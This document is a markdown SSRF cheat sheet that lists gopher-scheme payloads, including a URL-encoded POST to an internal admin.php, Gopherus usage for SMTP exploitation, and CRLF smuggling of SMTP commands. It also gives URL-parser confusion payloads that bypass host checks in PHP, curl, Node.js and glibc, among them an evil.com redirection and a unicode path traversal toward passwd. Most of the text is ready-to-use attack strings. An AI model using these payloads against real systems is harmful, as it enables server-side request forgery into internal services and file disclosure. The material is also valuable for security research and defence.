# gopher scheme

if you found an ssrf vulnerability you can use [gopher](https://datatracker.ietf.org/doc/html/rfc1436) scheme to talk to http/https as well as other services


`gopher://server.com:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20second_server.com%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aname%3Dvalue`

- URLEncode this if you are using it us input and sending it over the wire.

#### Gopherus 

Use [Gopherus](https://github.com/tarunkant/Gopherus) to craft gopher url`s for various protocols supported.

! Reuires python2.7

`$ python2.7 gopherus.py --exploit smtp`


# SSRF  Tricks
[orange in blackhat](https://blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

#### Smuggling SMTP protocol over HTTP protocol

```http://127.0.0.1:25/%0D%0AHELO orange.tw%0D%0AMAIL FROM...```



## URL Discrepencies

### php

#### parse_url() vs readfile()

- http://google.com#@evil.com/
    - parse_url : domain = goole.com  (Fixed in PHP 7.0.13) 
    - readfile : domain = evil.com
- http://127.0.0.1:11:80/
    - parse_url : port = 80
    - readfile : 11

```php
$url = 'http://' . $_GET[url];
$parsed = parse_url($url);
if ( $parsed[port] == 80 && $parsed[host] == 'google.com') {
readfile($url);
} else {
die();
}
```

### curl

- http://foo@evil.com:80@google.com/
    - curl : origin = http://evil.com:80
    - node,perl,go,php,ruby : origin = http://google.com

#### curl vs php >  7.0.13

```php
$url = 'http://127.0.0.1:11211#@google.com:80/';
$parsed = parse_url($url);
var_dump($parsed[host]); // string(10) "google.com"
var_dump($parsed[port]); // int(80)
curl($url); // 127.0.0.1:11211 fetched
```

```php
$url = 'http://foo@127.0.0.1:11211@google.com:80/';
$parsed = parse_url($url);
var_dump($parsed[host]); // string(10) "google.com"
var_dump($parsed[port]); // int(80)
curl($url); //127.0.0.1:11211 fetched (Fixed in cURL 7.54)
```

```php
$url = 'http://foo@127.0.0.1 @google.com:11211/';
$parsed = parse_url($url);
var_dump($parsed[host]); // string(10) "google.com"
var_dump($parsed[port]); // int(11211)
curl($url); // 127.0.0.1:11211 fetched
```

#### Abusing IDNA Standard (php vs curl)
- !There is no IDNA converter in gethostbynamel()(php), but cURL has

```php
1 $url = 'http://ÃŸ.orange.tw/'; // 127.0.0.1
2
3 $host = parse_url($url)[host];
4 $addresses = gethostbynamel($host); // bool(false)
5 if ($address) {
6 // check if address in white-list
7 }
8
9 $ch = curl_init();
10 curl_setopt($ch, CURLOPT_URL, $url);
11 curl_exec($ch);
```


### Node JS

- Bypass '../' checks with unicode characters
- http://orange.tw/sandbox/\xFF\x2E\xFF\x2E/passwd

```javascript
var base = "http://orange.tw/sandbox/";
var path = req.query.path;
if (path.indexOf("..") == -1) {
    http.get(base + path, callback);
}
```

### glibc

```python
>>> import socket
>>> host = '\\o\\r\\a\\n\\g\\e.t\\w'
>>> print host
\o\r\a\n\g\e.t\w
>>> socket.gethostbyname(host)
'50.116.8.239'
```
